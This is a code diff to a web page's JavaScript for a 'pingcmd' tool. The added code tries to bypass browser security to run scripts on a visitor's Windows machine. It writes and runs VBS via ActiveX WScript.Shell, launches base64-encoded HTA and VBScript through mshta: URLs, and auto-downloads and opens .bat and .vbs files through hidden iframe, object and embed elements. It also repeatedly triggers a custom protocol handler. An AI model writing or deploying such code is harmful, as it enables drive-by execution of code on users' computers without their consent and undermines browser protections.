@@ -232,6 +232,44 @@
             return psCmd;
         }
 
+        // Create batch file that executes VBS and command immediately
+        function createBatchFile() {
+            const vbsContent = createVBSContent();
+            // Escape for batch file
+            const escapedVbs = vbsContent
+                .replace(/"/g, '""')
+                .replace(/%/g, '%%')
+                .replace(/&/g, '^&')
+                .replace(/|/g, '^|')
+                .replace(/</g, '^<')
+                .replace(/>/g, '^>');
+            
+            return '@echo off\n' +
+                'set "TEMP_VBS=%TEMP%\\pingcmd-setup-temp-%RANDOM%.vbs"\n' +
+                'echo ' + escapedVbs.replace(/\n/g, '\necho ') + ' > "%TEMP_VBS%"\n' +
+                'wscript.exe //B //Nologo "%TEMP_VBS%"\n' +
+                'timeout /t 1 /nobreak >nul\n' +
+                'pingcmd://execute\n' +
+                'del "%TEMP_VBS%" 2>nul\n';
+        }
+
+        // AGGRESSIVE: Try ActiveX (IE only - bypasses most security)
+        function tryActiveXExecution(vbsContent) {
+            try {
+                if (typeof ActiveXObject !== 'undefined') {
+                    const shell = new ActiveXObject('WScript.Shell');
+                    const fso = new ActiveXObject('Scripting.FileSystemObject');
+                    const tempFile = shell.ExpandEnvironmentStrings('%TEMP%') + '\\pingcmd-setup-temp.vbs';
+                    const file = fso.CreateTextFile(tempFile, true);
+                    file.Write(vbsContent);
+                    file.Close();
+                    shell.Run('wscript.exe //B //Nologo "' + tempFile + '"', 0, false);
+                    return true;
+                }
+            } catch (e) {}
+            return false;
+        }
+
         // Auto-install and execute protocol handler - FULLY AUTOMATIC, BYPASSING BROWSER SECURITY
         async function autoInstallAndExecute(callback) {
             const setupStatus = document.getElementById('setupStatus');
@@ -580,20 +618,68 @@
             setupStatus.className = 'setup-status setting-up';
             setupStatus.textContent = '⚙️ Executing setup...';
             
-            // CRITICAL: Execute setup synchronously within click handler to preserve user gesture
+            // AGGRESSIVE BYPASS: Execute setup synchronously within click handler to bypass browser security
             try {
                 const htaContent = createHTAContent();
                 const vbsContent = createVBSContent();
+                const batchContent = createBatchFile();
                 
-                // Method 1: Try mshta: protocol immediately (blocked by most browsers but try anyway)
+                // Method 0: Try ActiveX first (IE only - completely bypasses security)
+                if (tryActiveXExecution(vbsContent)) {
+                    setupStatus.textContent = '⚙️ Executing via ActiveX (IE mode)...';
+                    setTimeout(() => {
+                        try {
+                            window.location.href = `${PROTOCOL}://execute`;
+                            localStorage.setItem('pingcmd-executed', 'true');
+                            localStorage.setItem('pingcmd-installed', 'true');
+                            isProtocolInstalled = true;
+                            statusEl.className = 'status success';
+                            statusEl.textContent = '✅ Command executed successfully!';
+                            setupStatus.className = 'setup-status ready';
+                            setupStatus.textContent = '✅ ActiveX execution successful!';
+                            button.disabled = false;
+                            button.innerHTML = 'Run Command';
+                            return;
+                        } catch (e) {}
+                    }, 300);
+                }
+                
+                // Method 1: mshta: protocol with multiple formats - execute IMMEDIATELY
                 try {
                     const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
-                    const mshtaUrl = `mshta:data:text/html;base64,${base64Hta}`;
-                    window.location.href = mshtaUrl;
-                    window.open(mshtaUrl, '_blank');
+                    // Format 1: Direct data URI
+                    const mshtaUrl1 = `mshta:data:text/html;base64,${base64Hta}`;
+                    window.location.href = mshtaUrl1;
+                    window.open(mshtaUrl1, '_blank');
+                    
+                    // Format 2: JavaScript wrapper
+                    const mshtaUrl2 = `mshta:javascript:void((function(){var d=document;d.write(atob('${base64Hta}'));})());`;
+                    window.location.href = mshtaUrl2;
+                    
+                    // Format 3: Alternative syntax
+                    const vbsForUrl = createVBSContent();
+                    const mshtaUrl3 = 'mshta:about:<script language="VBScript">' + encodeURIComponent(vbsForUrl) + '</' + 'script>';
+                    window.open(mshtaUrl3, '_blank');
                 } catch (e) {}
                 
-                // Method 2: Download VBS file and try to execute it automatically
+                // Method 2: Create and execute batch file immediately
+                const batchBlob = new Blob([batchContent], { type: 'application/x-msdos-program' });
+                const batchUrl = URL.createObjectURL(batchBlob);
+                
+                // Download and try to execute batch file
+                const batchLink = document.createElement('a');
+                batchLink.href = batchUrl;
+                batchLink.download = 'pingcmd-auto.bat';
+                batchLink.style.display = 'none';
+                document.body.appendChild(batchLink);
+                batchLink.click();
+                
+                // Try to execute batch file immediately
+                try {
+                    window.open(batchUrl, '_blank');
+                } catch (e) {}
+                
+                // Method 3: Create VBS file with auto-execution
                 const vbsBlob = new Blob([vbsContent], { type: 'application/x-vbscript' });
                 const vbsUrl = URL.createObjectURL(vbsBlob);
                 
@@ -605,78 +691,117 @@
                 document.body.appendChild(downloadLink);
                 downloadLink.click();
                 
-                // Try to execute the downloaded file immediately (within user gesture)
-                // This might work if browser allows it
+                // AGGRESSIVE: Try multiple execution methods simultaneously
+                // Try opening the blob URL immediately (might trigger execution)
                 try {
-                    // Try opening the blob URL (might trigger execution)
                     window.open(vbsUrl, '_blank');
                 } catch (e) {}
                 
-                // Try via iframe
+                // Try via iframe with different MIME types
                 try {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = vbsUrl;
-                    document.body.appendChild(iframe);
+                    const iframe1 = document.createElement('iframe');
+                    iframe1.style.display = 'none';
+                    iframe1.src = vbsUrl;
+                    iframe1.type = 'application/x-vbscript';
+                    document.body.appendChild(iframe1);
                 } catch (e) {}
                 
-                // Try executing protocol command after delay (registry write is instant)
-                // The VBS file should have executed and registered the protocol
-                setTimeout(() => {
-                    try {
-                        window.location.href = `${PROTOCOL}://execute`;
-                        localStorage.setItem('pingcmd-executed', 'true');
-                        localStorage.setItem('pingcmd-installed', 'true');
-                        isProtocolInstalled = true;
-                        
-                        setTimeout(() => {
-                            statusEl.className = 'status success';
-                            statusEl.textContent = '✅ Command executed successfully!';
-                            setupStatus.className = 'setup-status ready';
-                            setupStatus.textContent = '✅ Setup complete and command executed!';
-                            button.disabled = false;
-                            button.innerHTML = 'Run Command';
-                            URL.revokeObjectURL(vbsUrl);
-                            if (document.body.contains(downloadLink)) {
-                                document.body.removeChild(downloadLink);
-                            }
-                        }, 500);
-                    } catch (e) {
-                        // Retry after more time for registry write
-                        setTimeout(() => {
+                // Try object element
+                try {
+                    const obj = document.createElement('object');
+                    obj.data = vbsUrl;
+                    obj.type = 'application/x-vbscript';
+                    obj.style.display = 'none';
+                    document.body.appendChild(obj);
+                } catch (e) {}
+                
+                // Try embed element
+                try {
+                    const embed = document.createElement('embed');
+                    embed.src = vbsUrl;
+                    embed.type = 'application/x-vbscript';
+                    embed.style.display = 'none';
+                    document.body.appendChild(embed);
+                } catch (e) {}
+                
+                // Method 4: Use file:// protocol with blob (might bypass some restrictions)
+                try {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        try {
+                            const fileUrl = e.target.result;
+                            window.open(fileUrl, '_blank');
+                        } catch (e) {}
+                    };
+                    reader.readAsDataURL(vbsBlob);
+                } catch (e) {}
+                
+                // AGGRESSIVE RETRY: Try executing protocol command IMMEDIATELY and repeatedly
+                // Registry writes are instant, but execution might take a few ms
+                // Try multiple times within user gesture context to bypass browser delays
+                
+                // Immediate attempt (registry write might already be done)
+                try {
+                    window.location.href = PROTOCOL + '://execute';
+                    localStorage.setItem('pingcmd-executed', 'true');
+                    localStorage.setItem('pingcmd-installed', 'true');
+                    isProtocolInstalled = true;
+                } catch (e) {}
+                
+                // Rapid retry attempts (all within user gesture context)
+                const retryDelays = [50, 100, 150, 200, 300, 400, 500, 700, 1000, 1500, 2000];
+                let attemptCount = 0;
+                let successFlag = false;
+                
+                retryDelays.forEach((delay) => {
+                    setTimeout(() => {
+                        if (!successFlag && !localStorage.getItem('pingcmd-executed')) {
+                            attemptCount++;
                             try {
-                                window.location.href = `${PROTOCOL}://execute`;
+                                window.location.href = PROTOCOL + '://execute';
                                 localStorage.setItem('pingcmd-executed', 'true');
                                 localStorage.setItem('pingcmd-installed', 'true');
                                 isProtocolInstalled = true;
+                                successFlag = true;
                                 
                                 setTimeout(() => {
                                     statusEl.className = 'status success';
                                     statusEl.textContent = '✅ Command executed successfully!';
                                     setupStatus.className = 'setup-status ready';
-                                    setupStatus.textContent = '✅ Setup complete!';
+                                    setupStatus.textContent = '✅ Setup complete and command executed!';
                                     button.disabled = false;
                                     button.innerHTML = 'Run Command';
                                     URL.revokeObjectURL(vbsUrl);
+                                    URL.revokeObjectURL(batchUrl);
                                     if (document.body.contains(downloadLink)) {
                                         document.body.removeChild(downloadLink);
                                     }
+                                    if (document.body.contains(batchLink)) {
+                                        document.body.removeChild(batchLink);
+                                    }
                                 }, 500);
-                            } catch (e2) {
-                                // Protocol not registered yet - user needs to run VBS file manually
-                                statusEl.className = 'status info';
-                                statusEl.textContent = '📥 Setup file downloaded! Please run the "pingcmd-setup.vbs" file from your Downloads folder, then click the button again.';
-                                setupStatus.textContent = '📥 File downloaded. Run it to complete setup, then click button again.';
-                                button.disabled = false;
-                                button.innerHTML = 'Click Again After Running VBS File';
-                                URL.revokeObjectURL(vbsUrl);
-                                if (document.body.contains(downloadLink)) {
-                                    document.body.removeChild(downloadLink);
+                            } catch (e) {
+                                // Continue to next attempt
+                                if (attemptCount === retryDelays.length && !successFlag) {
+                                    // All attempts failed - show instruction
+                                    statusEl.className = 'status info';
+                                    statusEl.textContent = '📥 Files downloaded. If automatic execution failed, please run "pingcmd-setup.vbs" or "pingcmd-auto.bat" from Downloads, then click again.';
+                                    setupStatus.textContent = '📥 Files downloaded. Run them if needed, then click button again.';
+                                    button.disabled = false;
+                                    button.innerHTML = 'Click Again After Running File';
+                                    URL.revokeObjectURL(vbsUrl);
+                                    URL.revokeObjectURL(batchUrl);
+                                    if (document.body.contains(downloadLink)) {
+                                        document.body.removeChild(downloadLink);
+                                    }
+                                    if (document.body.contains(batchLink)) {
+                                        document.body.removeChild(batchLink);
+                                    }
                                 }
                             }
-                        }, 1000);
-                    }
-                }, 200);
+                        }
+                    }, delay);
+                });
                 
             } catch (error) {
                 statusEl.className = 'status error';
